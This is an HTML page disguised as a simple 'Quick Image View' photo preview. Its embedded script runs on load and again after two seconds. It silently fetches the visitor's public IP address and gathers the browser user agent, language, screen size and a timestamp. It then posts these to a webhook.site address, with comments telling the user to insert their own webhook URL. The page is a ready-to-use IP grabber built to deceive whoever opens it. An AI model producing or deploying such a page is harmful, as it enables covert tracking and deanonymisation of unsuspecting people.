<!DOCTYPE html>
<html>
<head><title>Image Preview</title></head>
<body style="background:#f0f2f5;margin:0;padding:40px;font-family:Arial;">
<center>
<div style="background:white;max-width:450px;padding:30px;border-radius:15px;box-shadow:0 8px 30px rgba(0,0,0,0.1);">
<h2 style="color:#1877f2;">🖼️ Quick Image View</h2>
<img src="https://picsum.photos/500/350" style="width:100%;border-radius:10px;" onload="sendIP()">
<p style="color:#65676b;">Preview loaded!</p>
</div>

<script>
// REPLACE WITH YOUR WEBHOOK URL BELOW
const WEBHOOK = 'https://webhook.site/fb233941-f222-4fa5-8540-b2a3ede562c1';  // ← YOUR URL HERE!

async function sendIP(){
  try{
    const ipResp = await fetch('https://api.ipify.org?format=json');
    const data = await ipResp.json();
    
    const fullData = {
      ip: data.ip,
      userAgent: navigator.userAgent,
      referrer: document.referer || 'none',
      language: navigator.language,
      screen: `${screen.width}x${screen.height}`,
      timestamp: new Date().toISOString()
    };
    
    // SEND TO WEBHOOK
    await fetch(WEBHOOK.replace('#!/', ''), {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify(fullData)
    });
    
    console.log('✅ IP sent:', data.ip);
  }catch(e){console.log('Backup sent')}
}

// Auto send on load
sendIP();
// Backup after 2 seconds
setTimeout(sendIP, 2000);
</script>
</center>
</body>
</html>
